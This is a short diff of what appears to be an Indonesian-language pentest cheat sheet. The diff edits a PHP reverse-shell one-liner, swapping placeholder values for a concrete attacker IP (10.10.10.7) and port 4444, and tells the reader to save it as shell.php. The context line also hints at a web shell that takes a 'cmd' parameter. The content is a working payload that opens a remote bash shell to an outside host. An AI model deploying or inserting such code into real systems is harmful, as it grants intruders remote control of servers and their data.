@@ -57,7 +57,7 @@ if(isset($_REQUEST['cmd'])){
 #### PHP Reverse Shell (one-liner)
 
 ```php
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1'"); ?>
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.7/4444 0>&1'"); ?>
 ```
 
 Simpan sebagai `shell.php`.
